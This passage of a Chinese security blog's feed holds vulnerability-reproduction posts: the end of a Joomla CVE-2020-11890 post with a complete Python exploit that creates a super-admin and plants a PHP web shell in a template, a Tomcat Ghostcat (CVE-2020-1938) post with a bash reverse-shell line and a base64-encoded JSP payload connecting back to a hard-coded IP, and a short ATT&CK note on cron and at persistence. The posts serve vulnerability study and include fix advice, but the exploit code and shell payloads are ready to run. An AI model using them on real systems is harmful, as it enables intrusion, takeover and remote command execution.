class="keyword">in</span> resp.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[!] Maybe failed to change group...&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;[+] Done!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_user</span>(<span class="params">url, sess, username, password, email, token</span>):</span></span><br><span class="line">    newdata = &#123;</span><br><span class="line">        <span class="comment"># Form data</span></span><br><span class="line">        <span class="string">&#x27;jform[name]&#x27;</span>: username,</span><br><span class="line">        <span class="string">&#x27;jform[username]&#x27;</span>: username,</span><br><span class="line">        <span class="string">&#x27;jform[password]&#x27;</span>: password,</span><br><span class="line">        <span class="string">&#x27;jform[password2]&#x27;</span>: password,</span><br><span class="line">        <span class="string">&#x27;jform[email]&#x27;</span>: email,</span><br><span class="line">        <span class="string">&#x27;jform[resetCount]&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&#x27;jform[sendEmail]&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&#x27;jform[block]&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&#x27;jform[requireReset]&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&#x27;jform[id]&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&#x27;jform[groups][]&#x27;</span>: <span class="number">8</span>,</span><br><span class="line">        token: <span class="number">1</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    newdata[<span class="string">&#x27;task&#x27;</span>] = <span class="string">&#x27;user.apply&#x27;</span></span><br><span class="line">    url_post = url + <span class="string">&quot;/administrator/index.php?option=com_users&amp;layout=edit&amp;id=0&quot;</span></span><br><span class="line">    sess.post(url_post, data=newdata, verify=<span class="literal">True</span>)</span><br><span class="line">    sess.get(url + <span class="string">&quot;/administrator/index.php?option=com_login&amp;task=logout&amp;&quot;</span> + token + <span class="string">&quot;=1&quot;</span>, verify=<span class="literal">True</span>)</span><br><span class="line">    sess = requests.Session()</span><br><span class="line">    <span class="keyword">if</span> try_admin_login(sess, url, username, password):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;[+] Now, you are super-admin!!!!!!!!!!!!!!!!&quot;</span> + <span class="string">&quot;\n[+] Your super-admin account: \n[+] USERNAME: &quot;</span> + username + <span class="string">&quot;\n[+] PASSWORD: &quot;</span> + password + <span class="string">&quot;\n[+] Done!&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;[-] Sorry,exploit fail!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> sess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeGroupDefault</span>(<span class="params">url, sess, token</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Changing group&quot;</span>)</span><br><span class="line">    newdata = &#123;</span><br><span class="line">        <span class="string">&#x27;jform[title]&#x27;</span>: <span class="string">&#x27;Public&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;jform[parent_id]&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&#x27;task&#x27;</span>: <span class="string">&#x27;group.apply&#x27;</span>,</span><br><span class="line">        token: <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    newdata[<span class="string">&#x27;task&#x27;</span>] = <span class="string">&#x27;group.apply&#x27;</span></span><br><span class="line">    resp = sess.post(url + <span class="string">&quot;/administrator/index.php?option=com_users&amp;layout=edit&amp;id=1&quot;</span>, data=newdata,</span><br><span class="line">                     verify=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;jform[parent_id]&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[!] Maybe failed to change group...&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;[+] Done!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rce</span>(<span class="params">sess, url, cmd, token</span>):</span></span><br><span class="line">    filename = <span class="string">&#x27;error.php&#x27;</span></span><br><span class="line">    shlink = url + <span class="string">&#x27;/administrator/index.php?option=com_templates&amp;view=template&amp;id=506&amp;file=506&amp;file=L2Vycm9yLnBocA%3D%3D&#x27;</span></span><br><span class="line">    shdata_up = &#123;</span><br><span class="line">        <span class="string">&#x27;jform[source]&#x27;</span>: <span class="string">&quot;&lt;?php echo &#x27;Hacked by HK\n&#x27; ;system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;task&#x27;</span>: <span class="string">&#x27;template.apply&#x27;</span>,</span><br><span class="line">        token: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;jform[extension_id]&#x27;</span>: <span class="string">&#x27;506&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;jform[filename]&#x27;</span>: <span class="string">&#x27;/&#x27;</span> + filename</span><br><span class="line">    &#125;</span><br><span class="line">    sess.post(shlink, data=shdata_up)</span><br><span class="line">    path2shell = <span class="string">&#x27;/templates/protostar/error.php?cmd=&#x27;</span> + cmd</span><br><span class="line">    <span class="comment"># print &#x27;[+] Shell is ready to use: &#x27; + str(path2shell)</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+] Checking:&#x27;</span></span><br><span class="line">    shreq = sess.get(url + path2shell)</span><br><span class="line">    shresp = shreq.text</span><br><span class="line">    <span class="built_in">print</span> shresp + <span class="string">&#x27;[+] Shell link: \n&#x27;</span> + (url + path2shell)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+] Module finished.&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># Construct the argument parser</span></span><br><span class="line">    ap = argparse.ArgumentParser()</span><br><span class="line">    <span class="comment"># Add the arguments to the parser</span></span><br><span class="line">    ap.add_argument(<span class="string">&quot;-url&quot;</span>, <span class="string">&quot;--url&quot;</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&quot; URL for your Joomla target&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--username&quot;</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&quot;username&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;-p&quot;</span>, <span class="string">&quot;--password&quot;</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&quot;password&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;-usuper&quot;</span>, <span class="string">&quot;--usernamesuper&quot;</span>, default=<span class="string">&quot;hk&quot;</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&quot;Super&#x27;s username&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;-psuper&quot;</span>, <span class="string">&quot;--passwordsuper&quot;</span>, default=<span class="string">&quot;12345678&quot;</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&quot;Super&#x27;s password&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;-esuper&quot;</span>, <span class="string">&quot;--emailsuper&quot;</span>, default=<span class="string">&quot;hk@hk.com&quot;</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&quot;Super&#x27;s Email&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;-cmd&quot;</span>, <span class="string">&quot;--command&quot;</span>, default=<span class="string">&quot;whoami&quot;</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&quot;command&quot;</span>)</span><br><span class="line">    args = <span class="built_in">vars</span>(ap.parse_args())</span><br><span class="line">    <span class="comment"># target</span></span><br><span class="line">    url = <span class="built_in">format</span>(<span class="built_in">str</span>(args[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+] Your target: &#x27;</span> + url</span><br><span class="line">    <span class="comment"># username</span></span><br><span class="line">    uname = <span class="built_in">format</span>(<span class="built_in">str</span>(args[<span class="string">&#x27;username&#x27;</span>]))</span><br><span class="line">    <span class="comment"># password</span></span><br><span class="line">    upass = <span class="built_in">format</span>(<span class="built_in">str</span>(args[<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line">    <span class="comment"># command</span></span><br><span class="line">    command = <span class="built_in">format</span>(<span class="built_in">str</span>(args[<span class="string">&#x27;command&#x27;</span>]))</span><br><span class="line">    <span class="comment"># username of superadmin</span></span><br><span class="line">    usuper = <span class="built_in">format</span>(<span class="built_in">str</span>(args[<span class="string">&#x27;usernamesuper&#x27;</span>]))</span><br><span class="line">    <span class="comment"># password of superadmin</span></span><br><span class="line">    psuper = <span class="built_in">format</span>(<span class="built_in">str</span>(args[<span class="string">&#x27;passwordsuper&#x27;</span>]))</span><br><span class="line">    <span class="comment"># email of superadmin</span></span><br><span class="line">    esuper = <span class="built_in">format</span>(<span class="built_in">str</span>(args[<span class="string">&#x27;emailsuper&#x27;</span>]))</span><br><span class="line">    <span class="comment"># session</span></span><br><span class="line">    sess = requests.Session()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> try_admin_login(sess, url, uname, upass): sys.exit()</span><br><span class="line">    token = checkAdmin(url, sess)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> changeGroup(url, sess, token):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;[-] Sorry,exploit fail!&quot;</span></span><br><span class="line">        sys.exit()</span><br><span class="line">    sess = create_user(url, sess, usuper, psuper, esuper, token)</span><br><span class="line">    token = checkSuperAdmin(url, sess)</span><br><span class="line">    <span class="comment"># Now you are Super-admin</span></span><br><span class="line">    <span class="keyword">if</span> token:</span><br><span class="line">        <span class="comment"># call RCE</span></span><br><span class="line">        changeGroupDefault(url, sess, token)  <span class="comment"># easy to view :))</span></span><br><span class="line">        rce(sess, url, command, token)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    sys.exit(main())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行POC</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python cve202011890.py -url http://localhost:8080 -u admin -p 1234</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200427231343047.png"></p><p>观察得知已生成webshell</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200427231451884.png" alt="image-20200427231451884"></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><blockquote><p>来源:MISC</p><p>链接:<a href="https://developer.joomla.org/security-centre/810-20200402-core-missing-checks-for-the-root-usergroup-in-usergroup-table.html">https://developer.joomla.org/security-centre/810-20200402-core-missing-checks-for-the-root-usergroup-in-usergroup-table.html</a></p></blockquote><blockquote><p>来源:nvd.nist.gov</p><p>链接:<a href="https://nvd.nist.gov/vuln/detail/CVE-2020-11890">https://nvd.nist.gov/vuln/detail/CVE-2020-11890</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CVE-2020-11890漏洞复现&quot;&gt;&lt;a href=&quot;#CVE-2020-11890漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;CVE-2020-11890漏洞复现&quot;&gt;&lt;/a&gt;CVE-2020-11890漏洞复现&lt;/h1&gt;&lt;h3 id=&quot;漏</summary>
      
    
    
    
    <category term="漏洞复现" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>Tomcat幽灵猫漏洞复现</title>
    <link href="http://example.com/2020/02/22/Tomcat-CVE-2020-1938%E5%A4%8D%E7%8E%B0/"/>
    <id>http://example.com/2020/02/22/Tomcat-CVE-2020-1938%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-02-22T10:58:01.000Z</published>
    <updated>2021-09-28T09:51:14.471Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Tomcat-CVE-2020-1938复现"><a href="#Tomcat-CVE-2020-1938复现" class="headerlink" title="Tomcat-CVE-2020-1938复现"></a>Tomcat-CVE-2020-1938复现</h1><p>[TOC]</p><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><blockquote><p>Tomcat是由Apache软件基金会属下Jakarta项目开发的Servlet容器，按照Sun Microsystems提供的技术规范，实现了对Servlet和JavaServer Page（JSP）的支持，并提供了作为Web服务器的一些特有功能，如Tomcat管理和控制平台、安全局管理和Tomcat阀等。由于Tomcat本身也内含了HTTP服务器，因此也可以视作单独的Web服务器。</p></blockquote><blockquote><p>攻击者通过Ajp协议端口利用该漏洞进行文件读取或包含 Tomcat 上所有 webapp 目录下的任意文件，如：webapp 配置文件、源代码等。</p></blockquote><h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Tomcat 6.*</span><br><span class="line">Tomcat 7.* &lt; 7.0.100</span><br><span class="line">Tomcat 8.* &lt; 8.5.51</span><br><span class="line">Tomcat 9.* &lt; 9.0.31</span><br></pre></td></tr></table></figure><h3 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h3><p>本次漏洞复现采用Docker<br>Tomcat版本8.5.32</p><ol><li>下载镜像</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker search tomcat-8.5.32</span><br><span class="line">docker pull duonghuuphuc/tomcat-8.5.32</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/2020/02/22/15823613269880.jpg"></p><ol><li>启动镜像<br>``<br><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/2020/02/22/15823644141674.jpg"></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images</span><br><span class="line">docker run -d -p 8080:8080 -p 8009:8009 --name ghostcat duonghuuphuc/tomcat-8.5.32</span><br><span class="line">docker port ghostcat</span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>相关漏洞利用脚本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/xindongzhuaizhuai/CVE-2020-1938</span><br><span class="line">https://github.com/nibiwodong/CNVD-2020-10487-Tomcat-ajp-POC</span><br></pre></td></tr></table></figure><p><strong>文件读取</strong><br><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/2020/02/22/15823650789821.jpg"><br><strong>文件包含RCE</strong><br>利用文件包含漏洞实现RCE，攻击需要满足一定的条件，即需要将payload文件上传到tomcat目录下，然后利用文件包含激活payload。这里以反弹shell为例</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/反弹ip/反弹端口 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>为了能正常执行需要对命令进行编码并组装成bash，推荐在线bash payload生成。<br><a href="http://www.jackson-t.ca/runtime-exec-payloads.html">bash payload</a><br>最终的payload文件test.txt如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    java.io.InputStream in = Runtime.getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTkuMjkuMTg2Ljg5Lzg4ODggMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;).getInputStream();</span><br><span class="line">    int a = -1;</span><br><span class="line">    byte[] b = new byte[2048];</span><br><span class="line">    out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">    while((a=in.read(b))!=-1)&#123;</span><br><span class="line">        out.println(new String(b));</span><br><span class="line">    &#125;</span><br><span class="line">    out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>开启监听<br>使用脚本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 8888</span><br><span class="line">python poc.py -p 8009 -f test.txt 目标ip</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/2020/02/22/15823666041048.jpg"></p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/2020/02/22/15823665764233.jpg"></p><h3 id="加固修复"><a href="#加固修复" class="headerlink" title="加固修复"></a>加固修复</h3><ol><li>Apache官方已发布9.0.31、8.5.51及7.0.100版本针对此漏洞进行修复，Apache Tomcat 6 已经停止维护，请升级到最新受支持的 Tomcat 版本以免遭受漏洞影响：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://tomcat.apache.org/download-70.cgi </span><br><span class="line">https://tomcat.apache.org/download-80.cgi</span><br><span class="line">https://tomcat.apache.org/download-90.cgi</span><br></pre></td></tr></table></figure><ol><li>使用AJP协议的临时处置方法：为AJP Connector配置secret来设置 AJP 协议的认证凭证，且注意口令强度</li><li>未使用AJP协议的临时处置方法：禁用AJP协议端口，在conf/server.xml配置文件中注释，并重启Tomcat服务</li></ol><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s/8Wueh4lkKBtfNisjxOSoWAhttps://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Tomcat-CVE-2020-1938复现&quot;&gt;&lt;a href=&quot;#Tomcat-CVE-2020-1938复现&quot; class=&quot;headerlink&quot; title=&quot;Tomcat-CVE-2020-1938复现&quot;&gt;&lt;/a&gt;Tomcat-CVE-2020-1938</summary>
      
    
    
    
    <category term="漏洞复现" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>计划任务</title>
    <link href="http://example.com/2020/01/26/ATT&amp;CK-%E6%8C%81%E4%B9%85%E5%8C%96-Local%20Job%20Scheduling/"/>
    <id>http://example.com/2020/01/26/ATT&amp;CK-%E6%8C%81%E4%B9%85%E5%8C%96-Local%20Job%20Scheduling/</id>
    <published>2020-01-26T12:32:11.000Z</published>
    <updated>2021-09-28T08:54:45.749Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ATT-amp-CK-持久化-Local-Job-Scheduling"><a href="#ATT-amp-CK-持久化-Local-Job-Scheduling" class="headerlink" title="ATT&amp;CK-持久化-Local Job Scheduling"></a>ATT&amp;CK-持久化-Local Job Scheduling</h1><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>在Linux系统上，支持多种方法来创建预定的和定期的后台作业：cron，at，与Windows系统上的“计划任务”不同，基于Linux的系统上的作业计划无法远程完成，除非在已建立的远程会话（如安全外壳（SSH））中结合使用</p><h3 id="测试用例"><a href="#测试用例" class="headerlink" title="测试用例"></a>测试用例</h3><h4 id="cron"><a href="#cron" class="headerlink" title="cron"></a>cron</h4><p>cron是大多数linux发行版都自带的守护进程（daemon），用来重复运行某些被设定好了确定的运行时间的任务，系统默认crontab文件为/etc/crontab,以及/etc/cron.d/目录下的文件，cron守护进程会检查/etc/crontab以及/etc/cron.d/目录下的文件，根据这些文件中的cron任务所设置的执行时间决定是否执行任务，如果当前时间与cron任务所设置的执行时间相同，则执行任务。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第1列分钟0～59</span><br><span class="line">第2列小时0～23（0表示子夜）</span><br><span class="line">第3列日1～31</span><br><span class="line">第4列月1～12</span><br><span class="line">第5列星期0～7（0和7表示星期天）</span><br><span class="line">第6列要运行的命令</span><br></pre></td></tr></table></figure><p>crontab -e 编辑一条任务<br>每天晚上9点30分执行命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">30 21 * * * command</span><br></pre></td></tr></table></figure><p>crontab -l列出任务列表<br><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/4PoIwU.png" alt="4PoIwU"><br>crontab -r 删除当前用户的任务</p><p>/etc/cron.d/ 目录下创建定时任务<br>创建test文件，内容为定时任务，这种方式创建的定时任务使用crontab -l命令是查看不了的<br><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/kKKQoq.png" alt="kKKQoq"></p><h4 id="at"><a href="#at" class="headerlink" title="at"></a>at</h4><p>at命令用于在指定时间执行命令。at允许使用一套相当复杂的指定时间的方法。它能够接受在当天的hh:mm（小时:分钟）式的时间指定。<br>命令参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">能够接受标准小时时间，hh:mm（小时:分钟）式的时间指定。例如，13:12。</span><br><span class="line">特定可命名时间，例如now，noon，teatime（一般是下午4点）等比较模糊的词语来指定时间。</span><br><span class="line">AM/PM指示符，采用12小时计时制，例如 10:10 AM。</span><br><span class="line">标准日期格式，MMDDYY，MM/DD/YY等，例如12/31/16。</span><br><span class="line">时间增量，例如now+25 min，10:17+7天。</span><br><span class="line">可以使用today、tomorrow来指定时间。</span><br></pre></td></tr></table></figure><p>执行shell文件<br><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/lYPka8.png" alt="lYPka8"><br>执行命令<br><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/VPp6ot.png" alt="VPp6ot"><br>atq查看任务列表<br><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/4iVmgf.png" alt="4iVmgf"><br>删除任务使用atrm 任务序号</p><h3 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h3><p>限制用户帐户的特权，以便只有授权用户才能创建计划的作业。</p><h3 id="侦测"><a href="#侦测" class="headerlink" title="侦测"></a>侦测</h3><p>监视启动任务和cron任务导致的流程执行，以查找异常或未知的应用程序和行为。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ATT-amp-CK-持久化-Local-Job-Scheduling&quot;&gt;&lt;a href=&quot;#ATT-amp-CK-持久化-Local-Job-Scheduling&quot; class=&quot;headerlink&quot; title=&quot;ATT&amp;amp;CK-持久化-Local J</summary>
      
    
    
    
    <category term="ATT&amp;CK" scheme="http://example.com/categories/ATT-CK/"/>
    
    
    <category term="ATT&amp;CK" scheme="http://example.com/tags/ATT-CK/"/>
    
  </entry>
  
</feed>
